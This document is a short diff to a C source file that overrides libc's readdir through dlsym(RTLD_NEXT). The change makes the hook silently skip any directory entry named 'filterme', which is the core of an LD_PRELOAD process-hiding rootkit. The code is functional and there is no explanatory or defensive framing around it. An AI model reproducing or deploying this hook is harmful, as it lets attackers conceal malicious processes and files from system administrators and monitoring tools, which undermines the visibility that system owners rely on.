@@ -9,12 +9,11 @@
 
 static const char* filter_proc = "filterme";
 
-#define DECLARE_READDIR(dirent, readdir)
 static struct dirent* (*original_readdir)(DIR*) = NULL;
 
 struct dirent* readdir(DIR *dirp) {
     struct dirent *dp;
-    //dirp = opendir(".");
+    //dirp = opendir("/");
 
     if(original_readdir == NULL) {
         original_readdir = dlsym(RTLD_NEXT, "readdir");
@@ -30,14 +29,13 @@ struct dirent* readdir(DIR *dirp) {
 
         if((dp = original_readdir(dirp)) != NULL) {
             if(strcmp(dp->d_name, filter_proc) == 0) {
-                closedir(dirp);
-                return dp;
+                continue;
             }
+			return dp;
         } else {
-            closedir(dirp);
             return dp;
         }
     }
-    closedir(dirp);
-    return dp;
+    return NULL;
 }
+
